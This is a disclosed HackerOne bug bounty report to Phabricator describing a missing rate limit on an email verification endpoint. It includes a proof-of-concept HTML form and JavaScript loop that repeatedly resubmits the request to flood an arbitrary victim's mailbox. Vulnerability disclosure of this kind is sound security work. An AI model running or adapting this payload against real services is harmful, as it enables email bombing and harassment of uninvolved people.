# The mailbox verification API interface is unlimited and can be used as a mailbox bomb

## Report Details
- **Report ID**: 221948
- **URL**: https://hackerone.com/reports/221948
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-04-18T16:38:04.383Z
- **Disclosed**: 2017-04-26T10:32:37.997Z

## Reporter
- **Username**: xifengweiyu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: phabricator

## Vulnerability Information
Here is your keyword: mongoose

- Description:

The API interface in https://admin.phacility.com/settings/user/toma/page/email/ is unlimited and can be used as a mailbox bomb

- Reproduced:

1.register a user and wait for verify email address
2.use my PoC:
```
<form id="myform" action="https://admin.phacility.com/settings/user/toma/page/email/?verify=14295" method="POST" target="_blank">
<input type="text" name="__csrf__" value="B@f3wyama2759fcd6f915746da">
<input type="text" name="__form__" value="1">
<input type="text" name="__dialog__" value="1">
<input type="text" name="verify" value="14295">
<input type="text" name="__submit__" value="true">
<input type="text" name="__wflow__" value="true">
<input type="text" name="__ajax__" value="true">
<input type="text" name="__metablock__" value="3">
</form>
<script>

function interval(func, wait, times){
    var interv = function(w, t){
        return function(){
            if(typeof t === "undefined" || t-- > 0){
                setTimeout(interv, w);
                try{
                    func.call(null);
                }
                catch(e){
                    t = 0;
                    throw e.toString();
                }
            }
        };
    }(wait, times);

    setTimeout(interv, wait);
};

//submit every 2000ms,execute 5 times(you can change this number to execute more times)
interval(function(){
document.getElementById("myform").submit();
},2000,5);
</script>
```
and its `__csrf__` is your token

- Note

Because the email address has not been verified this time,I can write any email address when registration,then I can bomb any people's email box.


## Attachments
- Screen_Shot_2017-04-09_at_3.33.14_PM.png
- Screen_Shot_2017-04-09_at_3.31.28_PM.png
